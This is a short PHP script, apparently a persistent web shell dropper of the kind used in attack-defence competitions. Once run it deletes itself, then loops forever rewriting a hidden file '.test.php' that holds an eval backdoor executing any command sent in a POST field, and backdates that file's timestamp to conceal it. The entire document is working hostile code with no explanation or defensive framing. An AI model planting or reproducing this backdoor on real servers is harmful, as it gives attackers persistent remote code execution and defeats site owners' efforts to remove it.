
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.test.php';
$code = '<?php @eval($_POST[cmd]); ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .test.php');
    usleep(5000);
}
?>